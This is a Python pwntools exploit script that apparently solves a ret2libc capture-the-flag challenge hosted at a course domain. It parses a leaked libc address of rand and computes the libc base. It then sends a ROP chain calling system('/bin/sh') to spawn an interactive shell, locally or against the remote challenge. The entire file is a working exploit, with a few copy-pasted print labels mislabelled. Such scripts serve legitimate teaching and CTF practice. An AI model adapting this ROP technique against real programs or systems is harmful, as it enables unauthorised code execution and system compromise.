from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break main
continue
'''

if args.REMOTE:
   libc = ELF('./libc6_2.28-0ubuntu1_amd64.so',checksec=False)
else:
   libc = e.libc
def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2libc-1.chals.io", 443, ssl=True, sni="cse4850-ret2libc-1.chals.io")
    else:
        return process(e.path)


p = start()



print(p.recvuntil(b'Random Value:'))
leak = int(p.recvline(), 16)
print(libc.sym['rand'])
print(leak)
libc.address = leak-libc.sym['rand']
rlibc = ROP(libc)

print("Leaked Address: 0x%x" %leak)
print("Leaked Libc at: 0x%x" %libc.address)
print("/bin/sh is at: 0x%x" %next(libc.search(b'/bin/sh')))
print("LibcSystem at: 0x%x" %libc.sym['system'])
print("LibcSystem at: 0x%x" %libc.sym['puts'])
print("LibcSystem at: 0x%x" %libc.sym['rand'])

chain = cyclic(16)
chain += p64(rlibc.find_gadget(['ret'])[0])
chain += p64(rlibc.find_gadget(['pop rdi','ret'])[0])
chain += p64(next(libc.search(b'/bin/sh')))
chain += p64(libc.sym['system'])


p.sendlineafter(b'-------------------------------------',chain)
p.interactive()


